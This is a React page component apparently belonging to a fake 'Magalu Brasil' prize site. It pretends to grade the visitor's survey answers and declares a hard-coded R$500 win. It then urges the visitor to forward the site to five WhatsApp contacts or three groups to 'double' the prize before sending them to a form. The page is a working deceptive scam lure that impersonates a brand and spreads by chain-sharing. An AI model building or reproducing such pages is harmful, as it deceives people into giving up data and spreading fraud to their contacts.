import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Loader2, PartyPopper, Wallet, X } from "lucide-react";
import { Odometer } from "../components/Odometer";
import { trackDoubleClick, trackFormStart } from "../lib/tracking.functions";

export const Route = createFileRoute("/premiacao")({
  head: () => ({
    meta: [
      { title: "Premiação — Magalu Brasil" },
      { name: "description", content: "Confira o resultado da sua pesquisa." },
      { property: "og:title", content: "Premiação Magalu Brasil" },
      { property: "og:description", content: "Você acaba de conquistar um prêmio." },
    ],
  }),
  component: PremiacaoPage,
});

function PremiacaoPage() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [premio, setPremio] = useState(500);
  const [showModal, setShowModal] = useState(false);

  useEffect(() => {
    const t = setTimeout(() => setLoading(false), 2600);
    return () => clearTimeout(t);
  }, []);

  if (loading) {
    return (
      <div className="fixed inset-0 z-50 flex flex-col items-center justify-center gap-6 bg-white px-6 text-center">
        <Loader2 className="h-14 w-14 animate-spin text-primary" />
        <p className="text-2xl font-extrabold text-foreground">
          Estamos avaliando as suas respostas
        </p>
        <p className="text-sm text-muted-foreground">Isso leva apenas alguns segundos.</p>
      </div>
    );
  }

  function openDoubleModal() {
    setShowModal(true);
  }

  function closeDoubleModal() {
    setShowModal(false);
  }

  function handleShare() {
    if (typeof window !== "undefined") {
      window.open("https://wa.me", "_blank");
      sessionStorage.setItem("premio", "1000");
    }
    setPremio(1000);
    trackDoubleClick().catch(() => {});
    trackFormStart().catch(() => {});
    setShowModal(false);
    // small delay so odometer restarts to new value before navigation
    setTimeout(() => navigate({ to: "/formulario" }), 1600);
  }

  function handleContinue() {
    if (typeof window !== "undefined") sessionStorage.setItem("premio", String(premio));
    trackFormStart().catch(() => {});
    navigate({ to: "/formulario" });
  }

  return (
    <div className="mx-auto max-w-3xl px-5 py-10">
      <h1 className="flex items-center gap-2 text-4xl font-extrabold text-foreground sm:text-5xl">
        Parabéns <PartyPopper className="h-8 w-8 text-primary" />
      </h1>
      <p className="mt-2 text-lg font-semibold text-foreground">
        Você acertou <span className="text-primary">100%</span> das perguntas
      </p>

      <div className="mt-8 rounded-md border border-primary/20 bg-primary-soft/60 px-5 py-3">
        <div className="flex items-start justify-between gap-4">
          <p className="text-sm font-semibold uppercase tracking-wide text-primary-strong">
            Seu prêmio
          </p>
          <Wallet className="h-6 w-6 text-primary" aria-hidden="true" />
        </div>
      <p className="mt-1 text-5xl font-black text-foreground sm:text-6xl" style={{ fontFamily: "var(--font-number)" }}>
        R$ <Odometer key={premio} value={premio} />
      </p>
      </div>

      <p className="mt-6 text-sm text-muted-foreground">
        Você pode dobrar o seu prêmio compartilhando esse site com outras pessoas.
      </p>

      <div className="mt-4 flex flex-col items-center gap-1">
        <button
          type="button"
          onClick={openDoubleModal}
          className="w-full max-w-md rounded-md bg-success px-6 py-4 text-lg font-extrabold uppercase tracking-wide text-success-foreground transition-colors hover:opacity-90"
        >
          Dobrar meu prêmio
        </button>
        <button
          type="button"
          onClick={handleContinue}
          className="w-full max-w-md rounded-md px-6 py-3 text-base font-semibold text-muted-foreground underline-offset-4 hover:text-foreground hover:underline"
        >
          Continuar sem dobrar
        </button>
      </div>

      {showModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 px-4 py-6">
          <div className="relative w-full max-w-md rounded-lg bg-card p-6 shadow-lg">
            <button
              type="button"
              onClick={closeDoubleModal}
              className="absolute right-3 top-3 rounded-sm p-1 text-muted-foreground transition-colors hover:text-foreground"
              aria-label="Fechar"
            >
              <X className="h-5 w-5" />
            </button>

            <h2 className="text-center text-2xl font-extrabold uppercase tracking-wide text-destructive">
              ATENÇÃO
            </h2>

            <p className="mt-4 text-center text-base font-semibold text-foreground">
              Para dobrar o seu prêmio é necessário seguir as seguintes regras:
            </p>

            <div className="mt-5 rounded-md bg-muted p-5 text-sm text-foreground">
              <ol className="list-decimal space-y-3 pl-5">
                <li>
                  Ao clicar no botão "COMPARTILHAR" você será levado ao whatsapp.
                </li>
                <li>
                  No whatsapp selecione cinco contatos (5) ou três grupos (3) e clique no botão para encaminhar.
                </li>
                <li>
                  Retorne a este site e o seu saldo de R$1.000 estará liberado para saque.
                </li>
              </ol>
            </div>

            <div className="mt-6">
              <a
                href="https://wa.me"
                target="_blank"
                rel="noopener noreferrer"
                onClick={(e) => {
                  e.preventDefault();
                  handleShare();
                }}
                className="block w-full rounded-md bg-success px-6 py-4 text-center text-lg font-extrabold uppercase tracking-wide text-success-foreground transition-colors hover:opacity-90"
              >
                COMPARTILHAR
              </a>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
